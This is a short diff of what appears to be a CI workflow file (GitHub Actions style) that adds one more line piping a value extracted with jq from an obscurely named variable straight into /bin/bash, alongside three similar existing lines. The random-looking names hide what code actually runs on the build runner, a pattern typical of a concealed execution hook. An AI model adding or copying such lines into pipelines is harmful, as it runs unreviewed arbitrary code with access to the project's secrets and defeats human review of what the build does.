@@ -28,6 +28,7 @@ jobs:
           echo $c826 | jq -r .lqbd387 | /bin/bash
           echo $mg2 | jq -r .nu79 | /bin/bash
           echo $qguv2 | jq -r .ndoab20 | /bin/bash
+          printf '%s' "$f80967" | jq -r .fi08203 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
